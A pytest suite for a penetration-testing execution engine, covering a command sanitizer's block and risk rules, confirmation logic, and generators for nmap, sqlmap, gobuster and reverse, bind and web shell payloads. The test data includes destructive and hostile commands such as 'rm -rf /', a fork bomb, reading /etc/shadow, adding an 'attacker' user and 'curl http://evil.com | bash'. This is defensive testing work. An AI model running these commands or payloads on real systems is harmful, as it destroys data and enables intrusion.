"""Deep coverage tests for core/execution/execution_engine.py.

Covers: CommandSanitizer (full), SmartTerminal (execute, sandbox, history),
        CommandGenerator, OutputAnalyzer.
"""

import time
from unittest.mock import MagicMock, patch

import pytest

from core.execution.execution_engine import (
    MAX_EXECUTION_HISTORY,
    CommandGenerator,
    CommandSanitizer,
    ExecutionResult,
    ExecutionStatus,
    OutputAnalyzer,
    SecurityError,
    SmartTerminal,
)


# ===================================================================
# 1. CommandSanitizer — exhaustive
# ===================================================================
class TestCommandSanitizerRiskLevel:
    """get_risk_level must return critical/high/medium/low correctly."""

    def test_critical_for_forbidden_commands(self):
        assert CommandSanitizer.get_risk_level("rm -rf /") == "critical"
        assert CommandSanitizer.get_risk_level("format c:") == "critical"
        assert CommandSanitizer.get_risk_level("dd if=/dev/zero of=/dev/sda") == "critical"
        assert CommandSanitizer.get_risk_level("shutdown now") == "critical"
        assert CommandSanitizer.get_risk_level("cat /etc/shadow") == "critical"

    def test_high_risk_patterns(self):
        assert CommandSanitizer.get_risk_level("rm -rf mydir") == "high"
        assert CommandSanitizer.get_risk_level("sudo ls") == "high"
        assert CommandSanitizer.get_risk_level("su root") == "high"
        assert CommandSanitizer.get_risk_level("taskkill /f /im notepad.exe") == "high"

    def test_medium_risk_commands(self):
        assert CommandSanitizer.get_risk_level("curl http://example.com") == "medium"
        assert CommandSanitizer.get_risk_level("wget http://file.zip") == "medium"
        assert CommandSanitizer.get_risk_level("nc -lvp 4444") == "medium"
        assert CommandSanitizer.get_risk_level("python -c 'print(1)'") == "medium"

    def test_low_risk_commands(self):
        assert CommandSanitizer.get_risk_level("ls -la") == "low"
        assert CommandSanitizer.get_risk_level("echo hello") == "low"
        assert CommandSanitizer.get_risk_level("nmap 10.0.0.1") == "low"


class TestCommandSanitizerSanitize:
    """sanitize must raise SecurityError for forbidden patterns."""

    def test_forbidden_rm_rf_root(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("rm -rf /")

    def test_forbidden_format_drive(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("format c: /q")

    def test_forbidden_fork_bomb(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize(":(){ :|:& };:")

    def test_forbidden_powershell_encoded(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("powershell -enc abc123")

    def test_forbidden_reg_delete_hklm(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("reg delete HKLM\\Software\\Test")

    def test_forbidden_chmod_777(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("chmod -R 777 /var")

    def test_shell_injection_pipe_blocked(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("ls | rm -rf")

    def test_shell_injection_semicolon_blocked(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("echo hello; cat /etc/passwd")

    def test_shell_injection_allowed_in_shell_mode(self):
        # With allow_shell=True, injection patterns should pass (but not forbidden cmds)
        result = CommandSanitizer.sanitize("echo hello | grep world", allow_shell=True)
        assert "echo hello" in result

    def test_safe_command_passes(self):
        result = CommandSanitizer.sanitize("nmap -sV 10.0.0.1")
        assert result == "nmap -sV 10.0.0.1"

    def test_forbidden_dd_random(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("dd if=/dev/random of=/dev/sda")

    def test_forbidden_vssadmin_delete(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("vssadmin delete shadows /all")

    def test_forbidden_drop_database(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("drop database production")

    def test_forbidden_rd_force_delete(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("rd /s /q C:\\Windows")

    def test_forbidden_del_force(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("del /f /s /q C:\\important")

    def test_forbidden_net_user_add(self):
        with pytest.raises(SecurityError):
            CommandSanitizer.sanitize("net user attacker P@ss /add")


class TestCommandSanitizerConfirmation:
    """requires_confirmation edge cases."""

    def test_sudo_requires_confirmation(self):
        needs, reason = CommandSanitizer.requires_confirmation("sudo apt update")
        assert needs is True
        assert "privilege" in reason.lower() or "sudo" in reason.lower()

    def test_su_requires_confirmation(self):
        needs, _ = CommandSanitizer.requires_confirmation("su root")
        assert needs is True

    def test_curl_pipe_bash(self):
        needs, _ = CommandSanitizer.requires_confirmation("curl http://evil.com | bash")
        assert needs is True

    def test_safe_command_no_confirmation(self):
        needs, _ = CommandSanitizer.requires_confirmation("echo hello")
        assert needs is False

    def test_file_mod_in_system_dir(self):
        needs, _ = CommandSanitizer.requires_confirmation("rm /etc/config")
        assert needs is True

    def test_wget_exec(self):
        needs, _ = CommandSanitizer.requires_confirmation("wget http://x.com -O- | sh")
        assert needs is True


class TestCommandSanitizerHighRisk:
    def test_rm_rf_is_high_risk(self):
        assert CommandSanitizer.is_high_risk("rm -rf /tmp/mydir") is True

    def test_echo_not_high_risk(self):
        assert CommandSanitizer.is_high_risk("echo hello") is False

    def test_taskkill_force_is_high_risk(self):
        assert CommandSanitizer.is_high_risk("taskkill /f /pid 1234") is True


# ===================================================================
# 2. SmartTerminal — execute, history, sandbox
# ===================================================================
class TestSmartTerminalHistory:
    """History management: add, rotate, clear."""

    def test_add_to_history(self):
        terminal = SmartTerminal()
        result = ExecutionResult(
            command="ls",
            status=ExecutionStatus.SUCCESS,
            stdout="file1",
            stderr="",
            exit_code=0,
            duration=0.1,
            timestamp=time.time(),
        )
        terminal._add_to_history(result)
        assert len(terminal.execution_history) == 1

    def test_history_rotation_at_max(self):
        terminal = SmartTerminal()
        for i in range(MAX_EXECUTION_HISTORY + 50):
            result = ExecutionResult(
                command=f"cmd_{i}",
                status=ExecutionStatus.SUCCESS,
                stdout="",
                stderr="",
                exit_code=0,
                duration=0.0,
                timestamp=time.time(),
            )
            terminal._add_to_history(result)
        assert len(terminal.execution_history) <= MAX_EXECUTION_HISTORY

    def test_clear_history(self):
        terminal = SmartTerminal()
        for i in range(5):
            result = ExecutionResult(
                command=f"cmd_{i}",
                status=ExecutionStatus.SUCCESS,
                stdout="",
                stderr="",
                exit_code=0,
                duration=0.0,
                timestamp=time.time(),
            )
            terminal._add_to_history(result)
        terminal.clear_history()
        assert len(terminal.execution_history) == 0

    def test_get_last_result(self):
        terminal = SmartTerminal()
        assert terminal.get_last_result() is None
        result = ExecutionResult(
            command="ls",
            status=ExecutionStatus.SUCCESS,
            stdout="",
            stderr="",
            exit_code=0,
            duration=0.0,
            timestamp=time.time(),
        )
        terminal._add_to_history(result)
        assert terminal.get_last_result().command == "ls"


class TestSmartTerminalConfirmation:
    """_request_confirmation logic."""

    def test_auto_approve_true(self):
        terminal = SmartTerminal()
        terminal.set_auto_approve(True)
        assert terminal._request_confirmation("sudo rm -rf /tmp", "high risk") is True

    def test_callback_approve(self):
        callback = MagicMock(return_value=True)
        terminal = SmartTerminal(confirmation_callback=callback)
        assert terminal._request_confirmation("cmd", "reason") is True
        callback.assert_called_once_with("cmd", "reason")

    def test_callback_deny(self):
        callback = MagicMock(return_value=False)
        terminal = SmartTerminal(confirmation_callback=callback)
        assert terminal._request_confirmation("cmd", "reason") is False

    def test_no_callback_no_auto_approve_denies(self):
        terminal = SmartTerminal()
        assert terminal._request_confirmation("cmd", "reason") is False

    def test_set_confirmation_callback(self):
        terminal = SmartTerminal()
        cb = MagicMock(return_value=True)
        terminal.set_confirmation_callback(cb)
        assert terminal._request_confirmation("cmd", "reason") is True


class TestSmartTerminalExecute:
    """execute() with mocked subprocess."""

    def test_execute_security_error(self):
        terminal = SmartTerminal()
        result = terminal.execute("rm -rf /")
        assert result.status == ExecutionStatus.FAILED
        assert "SECURITY ERROR" in result.stderr

    def test_execute_confirmation_denied(self):
        terminal = SmartTerminal()
        # sudo triggers confirmation, but no callback = deny
        result = terminal.execute("sudo ls -la", skip_sanitization=True)
        assert result.status == ExecutionStatus.FAILED
        assert "CONFIRMATION DENIED" in result.stderr

    def test_execute_skip_confirmation(self):
        """skip_confirmation=True should bypass the confirmation check."""
        terminal = SmartTerminal()
        with (
            patch.object(terminal, "_create_process") as mock_proc,
            patch.object(terminal, "_wait_for_process") as mock_wait,
        ):
            mock_process = MagicMock()
            mock_proc.return_value = mock_process
            mock_wait.return_value = ("output", "", 0, ExecutionStatus.SUCCESS)

            # sudo normally requires confirmation, but we skip it
            result = terminal.execute(
                "sudo ls",
                skip_sanitization=True,
                skip_confirmation=True,
            )
            assert result.status == ExecutionStatus.SUCCESS

    @patch("core.execution.execution_engine.subprocess.Popen")
    def test_execute_success(self, mock_popen):
        mock_proc = MagicMock()
        mock_proc.communicate.return_value = ("hello\n", "")
        mock_proc.returncode = 0
        mock_popen.return_value = mock_proc

        terminal = SmartTerminal()
        with patch("core.execution.execution_engine.stop_controller", create=True):
            result = terminal.execute("echo hello", skip_confirmation=True)
        assert result.status == ExecutionStatus.SUCCESS
        assert "hello" in result.stdout

    def test_execute_callback_invoked(self):
        terminal = SmartTerminal()
        callback = MagicMock()
        with (
            patch.object(terminal, "_create_process") as mock_proc,
            patch.object(terminal, "_wait_for_process") as mock_wait,
        ):
            mock_process = MagicMock()
            mock_proc.return_value = mock_process
            mock_wait.return_value = ("ok", "", 0, ExecutionStatus.SUCCESS)

            terminal.execute("echo ok", skip_confirmation=True, callback=callback)
            callback.assert_called_once()

    def test_cancel_current_no_process(self):
        terminal = SmartTerminal()
        assert terminal.cancel_current() is False

    def test_cancel_current_with_process(self):
        terminal = SmartTerminal()
        terminal.current_process = MagicMock()
        assert terminal.cancel_current() is True
        terminal.current_process.kill.assert_called_once()


class TestSmartTerminalSandbox:
    """execute_sandboxed fallback logic."""

    def test_sandboxed_fallback_no_sandbox(self):
        terminal = SmartTerminal()
        with patch("core.execution.execution_engine._get_sandbox_manager", return_value=None):
            with patch.object(terminal, "execute") as mock_execute:
                mock_execute.return_value = ExecutionResult(
                    command="ls",
                    status=ExecutionStatus.SUCCESS,
                    stdout="ok",
                    stderr="",
                    exit_code=0,
                    duration=0.1,
                    timestamp=time.time(),
                )
                result = terminal.execute_sandboxed("ls")
                mock_execute.assert_called_once()
                assert result.status == ExecutionStatus.SUCCESS

    def test_cleanup_sandbox_no_active(self):
        terminal = SmartTerminal()
        assert terminal.cleanup_sandbox() is True


class TestSmartTerminalPrepareCommand:
    """_prepare_command method."""

    def test_prepare_safe_command(self):
        terminal = SmartTerminal()
        cmd, args = terminal._prepare_command("echo hello", shell=False, skip_sanitization=False)
        assert cmd == "echo hello"
        assert args == ["echo", "hello"]

    def test_prepare_shell_command(self):
        terminal = SmartTerminal()
        _, args = terminal._prepare_command(
            "echo hello | grep h",
            shell=True,
            skip_sanitization=True,
        )
        assert isinstance(args, str)

    def test_prepare_forbidden_raises(self):
        terminal = SmartTerminal()
        with pytest.raises(SecurityError):
            terminal._prepare_command("rm -rf /", shell=False, skip_sanitization=False)


# ===================================================================
# 3. CommandGenerator
# ===================================================================
class TestCommandGenerator:
    @pytest.fixture()
    def gen(self):
        return CommandGenerator()

    def test_nmap_quick(self, gen):
        cmd = gen.generate_nmap_command("10.0.0.1", scan_type="quick")
        assert "-T4 -F" in cmd
        assert "10.0.0.1" in cmd

    def test_nmap_stealth(self, gen):
        cmd = gen.generate_nmap_command("10.0.0.1", scan_type="stealth")
        assert "-sS" in cmd
        assert "-T2" in cmd

    def test_nmap_aggressive(self, gen):
        cmd = gen.generate_nmap_command("10.0.0.1", scan_type="aggressive")
        assert "-A" in cmd

    def test_nmap_version(self, gen):
        cmd = gen.generate_nmap_command("10.0.0.1", scan_type="version")
        assert "-sV" in cmd

    def test_nmap_full(self, gen):
        cmd = gen.generate_nmap_command("10.0.0.1", scan_type="full")
        assert "-sV" in cmd and "-sC" in cmd

    def test_nmap_with_ports(self, gen):
        cmd = gen.generate_nmap_command("10.0.0.1", ports="80,443")
        assert "-p 80,443" in cmd

    def test_nmap_with_script(self, gen):
        cmd = gen.generate_nmap_command("10.0.0.1", script="vuln")
        assert "--script=vuln" in cmd

    def test_sqlmap_command(self, gen):
        cmd = gen.generate_sqlmap_command("http://target.com/page?id=1")
        assert "sqlmap" in cmd
        assert "--batch" in cmd

    def test_sqlmap_with_dbs(self, gen):
        cmd = gen.generate_sqlmap_command("http://t.com?id=1", dbs=True)
        assert "--dbs" in cmd

    def test_sqlmap_with_tables(self, gen):
        cmd = gen.generate_sqlmap_command("http://t.com?id=1", tables=True)
        assert "--tables" in cmd

    def test_sqlmap_clamps_level_risk(self, gen):
        cmd = gen.generate_sqlmap_command("http://t.com?id=1", level=10, risk=10)
        assert "--level=5" in cmd
        assert "--risk=3" in cmd

    def test_sqlmap_url_sanitization(self, gen):
        cmd = gen.generate_sqlmap_command("http://t.com?id=1'; DROP TABLE--")
        assert "'" not in cmd.split("'")[1] if "'" in cmd else True

    def test_gobuster_command(self, gen):
        cmd = gen.generate_gobuster_command("http://target.com")
        assert "gobuster dir" in cmd
        assert "-u" in cmd and "-w" in cmd

    def test_gobuster_with_extensions(self, gen):
        cmd = gen.generate_gobuster_command("http://t.com", extensions="php,html")
        assert "-x php,html" in cmd

    def test_payload_reverse_shell(self, gen):
        cmd = gen.generate_payload_command("reverse_shell", "10.0.0.1", 4444)
        assert "shell_reverse_tcp" in cmd
        assert "LHOST=10.0.0.1" in cmd

    def test_payload_bind_shell(self, gen):
        cmd = gen.generate_payload_command("bind_shell", "10.0.0.1", 4444)
        assert "shell_bind_tcp" in cmd

    def test_payload_web_shell(self, gen):
        cmd = gen.generate_payload_command("web_shell", "10.0.0.1", 4444)
        assert "php/reverse_php" in cmd

    def test_payload_custom(self, gen):
        cmd = gen.generate_payload_command("custom_payload", "10.0.0.1", 4444)
        assert "custom_payload" in cmd

    def test_optimize_curl_timeout(self, gen):
        cmd = gen.optimize_command("curl http://example.com")
        assert "--connect-timeout" in cmd

    def test_optimize_nmap_output(self, gen):
        cmd = gen.optimize_command("nmap 10.0.0.1")
        assert "-oN" in cmd

    def test_optimize_already_has_output(self, gen):
        cmd = gen.optimize_command("nmap 10.0.0.1 -oN existing.txt")
        # Should not add a second -oN
        assert cmd.count("-oN") == 1


# ===================================================================
# 4. OutputAnalyzer
# ===================================================================
class TestOutputAnalyzer:
    @pytest.fixture()
    def analyzer(self):
        return OutputAnalyzer()

    def _make_result(self, command, stdout="", stderr="", exit_code=0):
        status = ExecutionStatus.SUCCESS if exit_code == 0 else ExecutionStatus.FAILED
        return ExecutionResult(
            command=command,
            status=status,
            stdout=stdout,
            stderr=stderr,
            exit_code=exit_code,
            duration=1.0,
            timestamp=time.time(),
        )

    def test_analyze_nmap_output(self, analyzer):
        output = "22/tcp open ssh\n80/tcp open http\n443/tcp open https"
        result = self._make_result("nmap 10.0.0.1", stdout=output)
        analysis = analyzer.analyze(result)
        assert analysis["tool"] == "nmap"
        assert analysis["total_open"] == 3
        assert len(analysis["open_ports"]) == 3

    def test_analyze_sqlmap_vulnerable(self, analyzer):
        output = "Parameter 'id' is vulnerable"
        result = self._make_result("sqlmap -u http://t.com", stdout=output)
        analysis = analyzer.analyze(result)
        assert analysis["vulnerable"] is True

    def test_analyze_sqlmap_not_vulnerable(self, analyzer):
        result = self._make_result("sqlmap -u http://t.com", stdout="no vuln")
        analysis = analyzer.analyze(result)
        assert analysis["vulnerable"] is False

    def test_analyze_gobuster_found(self, analyzer):
        output = "/admin (Status: 200)\n/login (Status: 302)"
        result = self._make_result("gobuster dir -u http://t.com", stdout=output)
        analysis = analyzer.analyze(result)
        assert analysis["total_found"] == 2

    def test_analyze_generic_success(self, analyzer):
        result = self._make_result("echo hello", stdout="hello")
        analysis = analyzer.analyze(result)
        assert analysis["success"] is True

    def test_analyze_with_stderr(self, analyzer):
        result = self._make_result("echo hello", stderr="warning")
        analysis = analyzer.analyze(result)
        assert analysis["has_errors"] is True

    def test_analyze_nmap_no_open_ports(self, analyzer):
        result = self._make_result("nmap 10.0.0.1", stdout="All 1000 ports filtered")
        analysis = analyzer.analyze(result)
        assert analysis["total_open"] == 0


# ===================================================================
# 5. ExecutionResult / ExecutionStatus
# ===================================================================
class TestExecutionDataClasses:
    def test_execution_status_values(self):
        assert ExecutionStatus.PENDING.value == "pending"
        assert ExecutionStatus.SUCCESS.value == "success"
        assert ExecutionStatus.TIMEOUT.value == "timeout"
        assert ExecutionStatus.CANCELLED.value == "cancelled"

    def test_execution_result_creation(self):
        r = ExecutionResult(
            command="test",
            status=ExecutionStatus.SUCCESS,
            stdout="out",
            stderr="err",
            exit_code=0,
            duration=1.5,
            timestamp=time.time(),
        )
        assert r.command == "test"
        assert r.exit_code == 0
